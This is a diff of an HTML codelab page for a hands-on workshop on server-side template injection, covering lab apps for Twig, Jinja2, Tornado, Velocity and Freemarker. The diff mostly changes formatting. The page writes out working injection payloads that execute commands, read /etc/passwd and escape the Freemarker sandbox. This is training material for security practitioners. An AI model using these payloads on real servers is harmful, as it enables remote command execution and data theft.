@@ -29,14 +29,14 @@
     
       <google-codelab-step label="Introduction" duration="5">
         <p>Welcome to this 2-hour workshop on Template Injection. Template injection, also known as Server-Side Template Injection (SSTI), is a vulnerability class that has emerged in 2015. The 2015 Black Hat talk from James Kettle established the foundations for the exploitation techniques in multiple template engines. The exploitation of this type of issue will require specific knowledge of the template library or the language being used under the hood.</p>
-<p>The workshop is divided in six labs and an introduction. First, there will be an introduction to the vulnerability. This segment is needed to get a good understanding of the attack patterns to recognize potential vulnerabilities.<br>Then we will investigate five different template engines with unique twists. Each template engine will have an exercise which consists of a web application with a template engine being exposed.</p>
+<p>The workshop is divided in six labs and an introduction. First, there will be an introduction to the vulnerability. This segment is needed to get a good understanding of the attack patterns to recognize potential vulnerabilities. Then we will investigate five different template engines with unique twists. Each template engine will have an exercise which consists of a web application with a template engine being exposed.</p>
 <ul>
-<li>Introduction<br><br><ul>
+<li>Introduction  <ul>
 <li>Template Injection</li>
 <li>Identifying Template Engine</li>
 </ul>
 </li>
-<li>Template Engines<br><br><ul>
+<li>Template Engines  <ul>
 <li>Twig (PHP)</li>
 <li>Jinja2 (Python)</li>
 <li>Tornado (Python)</li>
@@ -56,18 +56,17 @@
 <h2 is-upgraded>Running the applications</h2>
 <p>In order to do the exercise, you will need to run the <a href="https://github.com/GoSecure/template-injection-workshop" target="_blank">lab applications</a> by yourself. All applications were built with a docker container recipe. This should make the deployment easier.</p>
 <ol type="1">
-<li>Download the code.<pre><code>$ git clone https://github.com/GoSecure/template-injection-workshop
-</code></pre>
-</li>
+<li>Download the code. <br><code>$ git clone https://github.com/GoSecure/template-injection-workshop<br></code></li>
 <li>Read build instructions (<code>%application_dir%/README.md</code>) This step will differ for each application.</li>
-<li>Use docker-compose to start the application.<pre><code>$ docker-compose up
-</code></pre>
-</li>
+<li>Use docker-compose to start the application. <br><code>$ docker-compose up<br></code></li>
 </ol>
 <h2 is-upgraded>Optional DNS configuration</h2>
 <p>In order to make the links work, you can optionally add an entry to your local host file. (<code>/etc/hosts</code> or <code>C:\Windows\system32\drivers\etc\hosts</code>)</p>
 <pre><code>127.0.0.1   template-injection.gosec.co
 </code></pre>
+<h2 is-upgraded>Video presentation</h2>
+<p>You can watch the complete workshop on video. From the video, you will be able to listen to all the tutorials and see the demonstrations for all exercises. Open the <a href="https://youtu.be/I7xQZOvZzIw" target="_blank">YouTube page in a new window</a> to see the chapters.</p>
+<iframe class="youtube-video" src="https://www.youtube.com/embed/I7xQZOvZzIw?rel=0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
 
 
       </google-codelab-step>
@@ -75,17 +74,17 @@
       <google-codelab-step label="Template Injection" duration="0">
         <p>A template engine enables you to use static template files in your application. At runtime, the template engine replaces variables in a template file with actual values, and transforms the template into an HTML file sent to the client. This approach makes it easier to design an HTML page.</p>
 <p>Although the templates were deployed statically, the advent of highly configurable service (SaaS) led several template libraries to be exposed directly on the internet. These seemingly very limited libraries are actually much more powerful than some developers might think.</p>
-<p class="image-container"><img alt="Template Injection" src="img\af9850d0f7c6b18c.png"></p>
+<p class="image-container"><img alt="Template Injection" src="img\\af9850d0f7c6b18c.png"></p>
 <h2 is-upgraded>Example of Data Binding</h2>
 <p>In a template, the developer will define both static content and place holder for dynamic values. At runtime, the template will be processed by its engine to map dynamic values references in the template.</p>
 <pre><code>Hello &#123;&#123;firstName}} &#123;&#123;lastName}}!
 </code></pre>
-<p><em>Example of simple template</em></p>
+<p><strong><em>Example of simple template</em></strong></p>
 <p>Template is a form of script that will do much more than just simple data binding. Because data structure can be complex (think about list and nested objects), templates provide some capabilities similar to programming. For instance, the template engine might allow to reach field from objects, .</p>
 <pre><code>Hello &#123;&#123;user.firstName}} &#123;&#123;user.lastName}}!
 </code></pre>
-<p><em>Example of nested properties</em></p>
-<p>Nested properties like the above will not be evaluated directly by the language. The dynamic value <code>user.firstName</code> inside the place holder will be parsed by the engine. The engine will make under the hood the call to the method or field firstName.<br>The syntax is generally simple and compact for ease of use. The syntax is often powerful enough to escape the context of simple data binding.</p>
+<p><strong><em>Example of nested properties</em></strong></p>
+<p>Nested properties like the above will not be evaluated directly by the language. The dynamic value <code>user.firstName</code> inside the place holder will be parsed by the engine. The engine will make under the hood the call to the method or field firstName. The syntax is generally simple and compact for ease of use. The syntax is often powerful enough to escape the context of simple data binding.</p>
 <h2 is-upgraded>Thinking outside the box</h2>
 <p>In order to abuse a template engine, the attacker will need to take advantage of the capabilities made available.</p>
 <p>If the engine allows the access of fields, we might be able to access interesting internal data structure. Internal data structure could have interesting state to override. They may expose powerful types.</p>
@@ -106,37 +105,37 @@
 <h2 is-upgraded>Heuristics</h2>
 <p>Instead of blindly testing every known payload, it is best to confirm with some level of confidence the technology used. The final payload might require some adjustments to take into account the specific runtime environment.</p>
 <p>James Kettles as come up with this  decision tree which can be used to identify the template technogoly used. It is composed of simple evaluation. Those expression will not work with every technology. Because these are very basic expression, they are less likely to become obsolete when a new version of a library is released. Method names allowed and advanced syntaxes are likely to evolve over time.</p>
-<p class="image-container"><img alt="Template Injection" src="img\a98649c6cdc65546.png"></p>
-<p><em>Fig 1: Detection tree (</em><a href="https://portswigger.net/research/server-side-template-injection" target="_blank"><em>Source PortSwigger Blog</em></a><em>)</em></p>
+<p class="image-container"><img alt="Template Injection" src="img\\a98649c6cdc65546.png"></p>
+<p><strong><em>Fig 1: Detection tree (</em></strong><a href="https://portswigger.net/research/server-side-template-injection" target="_blank"><strong><em>Source PortSwigger Blog</em></strong></a><strong><em>)</em></strong></p>
 
 
       </google-codelab-step>
     
       <google-codelab-step label="LAB 1: Twig (PHP)" duration="20">
-        <p class="image-container"><img alt="Twig Template" src="img\3c952e642913e16.png"></p>
+        <p class="image-container"><img alt="Twig Template" src="img\\3c952e642913e16.png"></p>
 <h2 is-upgraded>Introduction</h2>
 <p>Twig is probably the most popular template library in PHP. It was developed by the creator of Synfony a very popular PHP framework. In a bonus exercise, we will use Craft CMS a content management system using internally Twig.</p>
 <h2 is-upgraded>Template syntax basics</h2>
 <p>Twig syntax is simple and compact syntax. Here are a few examples of basic variable binding.</p>
-<pre><code>Hello &#123;&#123; var }}
+<pre><code language="language-js" class="language-js">Hello &#123;&#123; var }}
 Hello &#123;&#123; var|escape }}
 </code></pre>
 <p><em>Basic variable binding</em></p>
 <p>Reference: <a href="https://twig.symfony.com/" target="_blank">Official Twig documentation</a></p>
 <h2 is-upgraded>Opportunity for exploitation</h2>
 <p>Twig a variable <code>_self</code> which make public a few internal Twig API. Here is a malicious payload that was created to take advantage of the <code>registerUndefinedFilterCallback</code> function. In the payload below the command <code>id</code> is executed returning the id from the current user (Linux).</p>
-<pre><code>&#123;&#123;_self.env.registerUndefinedFilterCallback(&#34;exec&#34;)}}&#123;&#123;_self.env.getFilter(&#34;id&#34;)}}
+<pre><code language="language-js" class="language-js">&#123;&#123;_self.env.registerUndefinedFilterCallback(&#34;exec&#34;)}}&#123;&#123;_self.env.getFilter(&#34;id&#34;)}}
 </code></pre>
 <p><em>Example of command execution</em></p>
 <h2 is-upgraded>Workshop exercise</h2>
 <p>For this exercise, connect to the web server <a href="http://template-injection.gosec.co:8012/" target="_blank">http://template-injection.gosec.co:8012/</a>.</p>
 <p>It will contain a very simple form with only one field.</p>
-<p class="image-container"><img alt="Screenshot 1" src="img\cbf7eb745efe8802.png"></p>
+<p class="image-container"><img alt="Screenshot 1" src="img\\cbf7eb745efe8802.png"></p>
 <p>In this form, you can submit a simple expression to confirm that a template is used to display a value. The expression bellow will do a subtraction.</p>
 <pre><code>&#123;&#123;1338-1}}
 </code></pre>
 <p><em>This subtraction should display 1337 as result</em></p>
-<pre><code>&#123;&#123;_self.env.registerUndefinedFilterCallback(&#34;exec&#34;)}}&#123;&#123;_self.env.getFilter(&#34;id&#34;)}}
+<pre><code language="language-js" class="language-js">&#123;&#123;_self.env.registerUndefinedFilterCallback(&#34;exec&#34;)}}&#123;&#123;_self.env.getFilter(&#34;id&#34;)}}
 </code></pre>
 <p><em>Executing the id command</em></p>
 <p>The result of the id command should be:</p>
@@ -148,12 +147,12 @@ Hello &#123;&#123; var|escape }}
       </google-codelab-step>
     
       <google-codelab-step label="LAB 2: Jinja2 (Python)" duration="20">
-        <p class="image-container"><img alt="Jinja Template" src="img\ded9f636e6f8e994.png"></p>
+        <p class="image-container"><img alt="Jinja Template" src="img\\ded9f636e6f8e994.png"></p>
 <h2 is-upgraded>Introduction</h2>
 <p>Jinja is a popular template engine in Python. It is a template that is very similar to Django template. Compared to Django templates, Jinja can be easily used dynamically at runtime. Django templates are designed to be dynamic views which are stored in static files.</p>
 <h2 is-upgraded>Template syntax basics</h2>
 <p>Here are few simple expressions that illustrate the basic syntax.</p>
-<pre><code>//String
+<pre><code language="language-js" class="language-js">//String
 &#123;&#123; message }}
 //Accessing an attribute
 &#123;&#123; foo.bar }}
@@ -180,8 +179,8 @@ Hello &#123;&#123; var|escape }}
 
 &lt;type &#39;type&#39;&gt;, &lt;type &#39;weakref&#39;&gt;, &lt;type &#39;weakcallableproxy&#39;&gt;, &lt;type &#39;weakproxy&#39;&gt;, &lt;type &#39;int&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;bytearray&#39;&gt;, &lt;type &#39;list&#39;&gt;, &lt;type &#39;NoneType&#39;&gt;, &lt;type &#39;NotImplementedType&#39;&gt;, &lt;type &#39;traceback&#39;&gt;, &lt;type &#39;super&#39;&gt;, &lt;type &#39;xrange&#39;&gt;, &lt;type &#39;dict&#39;&gt;, &lt;type &#39;set&#39;&gt;, &lt;type &#39;slice&#39;&gt;, &lt;type &#39;staticmethod&#39;&gt;, &lt;type &#39;complex&#39;&gt;, &lt;type &#39;float&#39;&gt;, &lt;type &#39;buffer&#39;&gt;, &lt;type &#39;long&#39;&gt;, &lt;type &#39;frozenset&#39;&gt;, &lt;type &#39;property&#39;&gt;, &lt;type &#39;memoryview&#39;&gt;, &lt;type &#39;tuple&#39;&gt;, &lt;type &#39;enumerate&#39;&gt;, &lt;type &#39;reversed&#39;&gt; [...]
 </code></pre>
-<p>We can pick any type from the previous list and call methods from those. The element at index 40 in the object subclasses list is <code>&lt;type &#39;file&#39;&gt;</code> (<code>&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[40]</code>). We can use this type to read arbitrary files.</p>
-<pre><code>&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#34;/etc/passwd&#34;,&#34;r&#34;).read()}}
+<p>We can pick any type from the previous list and call methods from those. The element at index 40 in the object subclasses list is <code><type 'file'></code> (<code>&#123;&#123;''.__class__.__mro__[2].__subclasses__()[40]</code>). We can use this type to read arbitrary files.</p>
+<pre><code language="language-js" class="language-js">&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#34;/etc/passwd&#34;,&#34;r&#34;).read()}}
 
 //The previous extension is analog to
 file(&#34;/etc/passwd&#34;,&#34;r&#34;).read()
@@ -209,7 +208,7 @@ file(&#34;/etc/passwd&#34;,&#34;r&#34;).read()
 <pre><code>&#123;&#123;[].__class__.__mro__[1].__subclasses__()[245](&#39;ls /&#39;,shell=True,stdout=-1).communicate()[0].strip()}}
 </code></pre>
 <h3 is-upgraded>Alternative os object (Python 2.7)</h3>
-<p>There is an interesting type that we can be abused <code>&lt;class &#39;warnings.catch_warnings&#39;&gt;</code>. It has a cache of all python modules available. From the instance we can reach the os module.</p>
+<p>There is an interesting type that we can be abused <code><class 'warnings.catch_warnings'></code>. It has a cache of all python modules available. From the instance we can reach the os module.</p>
 <pre><code>WARNINGS_INSTANCE.__init__.func_globals[&#39;linecache&#39;].__dict__.values()[12]
 
 &lt;module &#39;os&#39; from &#39;/usr/lib/python2.7/os.pyc&#39;&gt;
@@ -219,13 +218,13 @@ file(&#34;/etc/passwd&#34;,&#34;r&#34;).read()
 <pre><code>&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].__dict__.values()[12].system(&#39;id &gt; /tmp/cmd&#39;)}}
 </code></pre>
 <p>Here is a two-step payload that executes a command and store the result temporarily in the temp folder. The result is later read from another Jinja expression.</p>
-<pre><code>&#123;&#123; &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].__dict__.values()[12].system(&#39;id &gt; /tmp/cmd&#39;) }}&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#34;/tmp/cmd&#34;,&#34;r&#34;).read() }}
+<pre><code language="language-js" class="language-js">&#123;&#123; &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].__dict__.values()[12].system(&#39;id &gt; /tmp/cmd&#39;) }}&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#34;/tmp/cmd&#34;,&#34;r&#34;).read() }}
 </code></pre>
 <aside class="warning"><p>These payload are Python 2.7 specific.</p>
 </aside>
 <h2 is-upgraded>Workshop exercise</h2>
 <p>For this exercise, connect to the web server <a href="http://template-injection.gosec.co:8013/" target="_blank">http://template-injection.gosec.co:8013/</a>.</p>
-<p class="image-container"><img alt="Jinja Template" src="img\307f5508c2789f4b.png"></p>
+<p class="image-container"><img alt="Jinja Template" src="img\\307f5508c2789f4b.png"></p>
 <p>First, you must detect <strong>which HTTP parameter</strong> is placed inside a template. You can use simple arithmetic expressions for this.</p>
 <p>Use the above recipe to leverage the vulnerability to its full potential.</p>
 <p>Can you access to the file <code>flag.txt</code> on the server?</p>
@@ -234,7 +233,7 @@ file(&#34;/etc/passwd&#34;,&#34;r&#34;).read()
       </google-codelab-step>
     
       <google-codelab-step label="LAB 3: Tornado (Python)" duration="20">
-        <p class="image-container"><img alt="Tornado Template" src="img\875ad26d12d2d801.png"></p>
+        <p class="image-container"><img alt="Tornado Template" src="img\\875ad26d12d2d801.png"></p>
 <h2 is-upgraded>Introduction</h2>
 <p>Tornado template is an engine that is part of Tornado a popular Python web framework. This exercise will probably be the easiest. It should demonstrate that simply reading the library documentation can sometimes reveal powerful functionalities.</p>
 <h2 is-upgraded>Template syntax basics</h2>
@@ -253,7 +252,7 @@ file(&#34;/etc/passwd&#34;,&#34;r&#34;).read()
 </code></pre>
 <h2 is-upgraded>Workshop exercise</h2>
 <p>For this exercise, connect to the web server <a href="http://template-injection.gosec.co:8014/" target="_blank">http://template-injection.gosec.co:8014/</a>.</p>
-<p class="image-container"><img alt="Tornado Template" src="img\fc1444c555b1608e.png"></p>
+<p class="image-container"><img alt="Tornado Template" src="img\\fc1444c555b1608e.png"></p>
 <p>This service is simulating an email being sent every time you submit the form.</p>
 <p>Use the above recipe to leverage the vulnerability.</p>
 <p>Can you access to the file <code>flag.txt</code> on the server?</p>
@@ -262,7 +261,7 @@ file(&#34;/etc/passwd&#34;,&#34;r&#34;).read()
       </google-codelab-step>
     
       <google-codelab-step label="LAB 4: Velocity (Java)" duration="20">
-        <p class="image-container"><img alt="Velocity Template" src="img\5a2bc2850d4dbc0a.png"></p>
+        <p class="image-container"><img alt="Velocity Template" src="img\\5a2bc2850d4dbc0a.png"></p>
 <h2 is-upgraded>Introduction</h2>
 <p>Velocity is one of the most popular Java template engines. Freemarker is another very popular alternative. Velocity was chosen for this workshop because it is a bit harder to exploit.</p>
 <h2 is-upgraded>Template syntax basics</h2>
@@ -274,12 +273,12 @@ file(&#34;/etc/passwd&#34;,&#34;r&#34;).read()
 <aside class="warning"><p>In this workshop, the plugin will not be enabled.</p>
 </aside>
 <p>Velocity has variable assignment.</p>
-<pre><code>#set( $foo = &#34;bar&#34; )
+<pre><code language="language-js" class="language-js">#set( $foo = &#34;bar&#34; )
 
 $foo
 </code></pre>
-<p>This pattern is used to access interesting types.<br>Here is a payload that allow the execution of command without any optional plugin.</p>
-<pre><code>#set($x=&#39;&#39;)##
+<p>This pattern is used to access interesting types. Here is a payload that allow the execution of command without any optional plugin.</p>
+<pre><code language="language-js" class="language-js">#set($x=&#39;&#39;)##
 #set($rt=$x.class.forName(&#39;java.lang.Runtime&#39;))##
 #set($chr=$x.class.forName(&#39;java.lang.Character&#39;))##
 #set($str=$x.class.forName(&#39;java.lang.String&#39;))##
@@ -292,7 +291,7 @@ $ex.waitFor()
 <h2 is-upgraded>Workshop exercise</h2>
 <p>For this exercise, connect to the web server <a href="http://template-injection.gosec.co:8005/" target="_blank">http://template-injection.gosec.co:8005/</a>.</p>
 <p>To access the administrative features, use the credentials <code>admin</code> / <code>123456</code>.</p>
-<p class="image-container"><img alt="Velocity application" src="img\1e22f7c66e2834e.png"></p>
+<p class="image-container"><img alt="Velocity application" src="img\\1e22f7c66e2834e.png"></p>
 <p>Use the above recipe to leverage the vulnerability.</p>
 <p>Can you access to the file <code>flag.txt</code> on the server?</p>
 
@@ -300,7 +299,7 @@ $ex.waitFor()
       </google-codelab-step>
     
       <google-codelab-step label="LAB 5: Freemarker (Java)" duration="15">
-        <p class="image-container"><img alt="Freemarker Template" src="img\dc9189e36345917.png"></p>
+        <p class="image-container"><img alt="Freemarker Template" src="img\\dc9189e36345917.png"></p>
 <h2 is-upgraded>Introduction</h2>
 <p>Freemarker is another popular Java template engine. Its development is slightly more active than Velocity.</p>
 <h2 is-upgraded>Template syntax basics</h2>
@@ -312,7 +311,7 @@ ${user.displayName}
 <h2 is-upgraded>Opportunity for exploitation</h2>
 <h3 is-upgraded>Built-ins</h3>
 <p>Freemarker has a specific list of built-in function (often called built-in in Freemarker documentation). These <a href="https://freemarker.apache.org/docs/ref_builtins_expert.html" target="_blank">built-in functions</a> can be suffixes to variable. For example, <code>${nbAverageUsers}</code> can be transformed to <code>${nbAverageUsers?abs}</code>.</p>
-<pre><code>abs, absoluteTemplateName, ancestors, api, 
+<pre><code language="language-xml" class="language-xml">abs, absoluteTemplateName, ancestors, api, 
 boolean, byte, 
 c, capFirst, capitalize, ceiling, children, chopLinebreak, chunk, contains, counter, 
 date, dateIfUnknown, datetime, datetimeIfUnknown, default, double, dropWhile, 
@@ -337,31 +336,31 @@ xhtml, xml
 </code></pre>
 <p><em>Exhaustive list of all built-in</em></p>
 <p><a href="https://freemarker.apache.org/docs/ref_builtins_expert.html" target="_blank">Most built-ins</a> are really primitive and uninteresting from a security standpoint. But there is one that standout: <code>new</code>. We can read the following notice in the official documentation.</p>
-<aside class="warning"><p>&#34;This built-in can be a security concern because the template author can create arbitrary Java objects and then use them, as far as they implement <code>TemplateModel</code>. Also the template<br>author can trigger static initialization for classes that don&#39;t even implement <code>TemplateModel</code>.&#34;<br>Ref: <a href="https://freemarker.apache.org/docs/ref_builtins_expert.html#ref_builtin_new" target="_blank">Freemarker docs: Built-in new</a></p>
+<aside class="warning"><p>&#34;This built-in can be a security concern because the template author can create arbitrary Java objects and then use them, as far as they implement <code>TemplateModel</code>. Also the template author can trigger static initialization for classes that don&#39;t even implement <code>TemplateModel</code>.&#34; Ref: <a href="https://freemarker.apache.org/docs/ref_builtins_expert.html#ref_builtin_new" target="_blank">Freemarker docs: Built-in new</a></p>
 </aside>
 <h3 is-upgraded>Execute class</h3>
 <p>Following the guidelines describe, we can invoke the <code>exec()</code> function (entry method for <code>TemplateModel</code>). By design the <code>Execute</code> class allows us to execute command and get the result in the form of a string.</p>
-<pre><code>&lt;#assign ex=&#34;freemarker.template.utility.Execute&#34;?new()&gt; ${ ex(&#34;id&#34;) }
+<pre><code language="language-xml" class="language-xml">&lt;#assign ex=&#34;freemarker.template.utility.Execute&#34;?new()&gt; ${ ex(&#34;id&#34;) }
 </code></pre>
 <h2 is-upgraded>Workshop exercise</h2>
 <p>For this exercise, connect to the web server <a href="http://template-injection.gosec.co:8025/" target="_blank">http://template-injection.gosec.co:8025/</a>.</p>
 <p>To access the administrative features, use the credentials <code>admin</code> / <code>hackfest</code>.</p>
-<p class="image-container"><img alt="Freemarker" src="img\aaf14e35025ef2ef.png"></p>
+<p class="image-container"><img alt="Freemarker" src="img\\aaf14e35025ef2ef.png"></p>
 <p>Use the above recipe to leverage the vulnerability.</p>
 <p>Can you access to the file <code>flag.txt</code> on the server?</p>
 <h2 is-upgraded>Potential defense mechanism</h2>
 <p>It is worth mentioning that Freemarker does provide a way to restrict the classes reference in templates. The next exercise will implement a <code>ClassResolver</code> as describe in the documentation.</p>
-<aside class="warning"><p>You can (since 2.3.17) restrict the classes accessible with this built-in using <code>Configuration.setNewBuiltinClassResolver(TemplateClassResolver)</code> or the <code>new_builtin_class_resolver</code> setting. See the Java API docs for more information. If you are allowing not-so-much-trusted users to upload templates then you should definitely look into this topic.<br>Ref: <a href="https://freemarker.apache.org/docs/ref_builtins_expert.html#ref_builtin_new" target="_blank">Freemarker docs: Built-in new</a></p>
+<aside class="warning"><p>You can (since 2.3.17) restrict the classes accessible with this built-in using <code>Configuration.setNewBuiltinClassResolver(TemplateClassResolver)</code> or the <code>new_builtin_class_resolver</code> setting. See the Java API docs for more information. If you are allowing not-so-much-trusted users to upload templates then you should definitely look into this topic. Ref: <a href="https://freemarker.apache.org/docs/ref_builtins_expert.html#ref_builtin_new" target="_blank">Freemarker docs: Built-in new</a></p>
 </aside>
 
 
       </google-codelab-step>
     
       <google-codelab-step label="LAB 6: Freemaker (Sandbox escape)" duration="15">
-        <p class="image-container"><img alt="Sandbox" src="img\4dad08e225b30f3d.png"></p>
+        <p class="image-container"><img alt="Sandbox" src="img\\4dad08e225b30f3d.png"></p>
 <h2 is-upgraded>Sandbox in Freemarker</h2>
-<p>Freemarker has the capability to filter which class can be access.<br>For instance, a subclass of the class <code>TemplateClassResolver</code> needs to be implemented. This class will decide if the class reference in the template is allow or not.</p>
-<pre><code>&lt;ul&gt;
+<p>Freemarker has the capability to filter which class can be access. For instance, a subclass of the class <code>TemplateClassResolver</code> needs to be implemented. This class will decide if the class reference in the template is allow or not.</p>
+<pre><code language="language-xml" class="language-xml">&lt;ul&gt;
 &lt;#list .data_model?keys as key&gt;
 &lt;li&gt;${key}&lt;/li&gt;
 &lt;/#list&gt;
@@ -382,7 +381,7 @@ xhtml, xml
 <li><code>org.springframework.context.ApplicationContext.getClassLoader()</code></li>
 </ul>
 <p>This API will translate into the following Freemarker syntax.</p>
-<pre><code>//java.lang.Object.getClass() -&gt; java.lang.Class.getClassLoader()
+<pre><code language="language-js" class="language-js">//java.lang.Object.getClass() -&gt; java.lang.Class.getClassLoader()
 ${any_object.class.classLoader}
 //javax.servlet.ServletRequest -&gt; javax.servlet.ServletContext.getClassLoader()
 ${request.servletContext.classLoader}
@@ -390,7 +389,7 @@ ${request.servletContext.classLoader}
 <h2 is-upgraded>Not all classloader are equals</h2>
 <p><a href="https://docs.oracle.com/javase/9/docs/api/java/lang/ClassLoader.html" target="_blank">Classloaders</a> may have a common subclass. Their implementation differ alot. Different web containers (web server hosting a Java application) will have different classloader at runtime. Therefore we need to ajust our payload to target the right one.</p>
 <h3 is-upgraded>Read file / directory listing</h3>
-<pre><code>&lt;#assign uri = classLoader.getResource(&#34;META-INF&#34;).toURI() &gt;
+<pre><code language="language-xml" class="language-xml">&lt;#assign uri = classLoader.getResource(&#34;META-INF&#34;).toURI() &gt;
 &lt;#assign url = uri.resolve(&#34;file:///etc/passwd&#34;).toURL() &gt;
 &lt;#assign bytes = url.openConnection().inputStream.readAllBytes() &gt;
 ${bytes}
@@ -407,7 +406,7 @@ ${bytes[2]}
 <h3 is-upgraded>Universal method</h3>
 <p>Oleksandr Mirosh and Alvaro Muñoz are detailing in their paper Room for Escape various chains that are specific to web containers. These containers are Tomcat, Jetty, GlassFish, WebLogic and WebSphere. These are a great source of inspiration if you are looking to escape the sandbox other than Freemarker.</p>
 <p>However if your objective is to exploit the current template engine, there is a universal payload (also from the same paper) that will work on Freemarker 2.3.29 and lower (Fixed in March 2020). You need to find a variable in the data model that is an object.</p>
-<pre><code>&lt;#assign classloader=&lt;&lt;object&gt;&gt;.class.protectionDomain.classLoader&gt;
+<pre><code language="language-xml" class="language-xml">&lt;#assign classloader=&lt;&lt;object&gt;&gt;.class.protectionDomain.classLoader&gt;
 &lt;#assign owc=classloader.loadClass(&#34;freemarker.template.ObjectWrapper&#34;)&gt;
 &lt;#assign dwf=owc.getField(&#34;DEFAULT_WRAPPER&#34;).get(null)&gt;
 &lt;#assign ec=classloader.loadClass(&#34;freemarker.template.utility.Execute&#34;)&gt;
@@ -464,6 +463,7 @@ failed
   <script src="https://storage.googleapis.com/codelab-elements/custom-elements.min.js"></script>
   <script src="https://storage.googleapis.com/codelab-elements/prettify.js"></script>
   <script src="https://storage.googleapis.com/codelab-elements/codelab-elements.js"></script>
+  <script src="//support.google.com/inapp/api.js"></script>
 
 </body>
 </html>
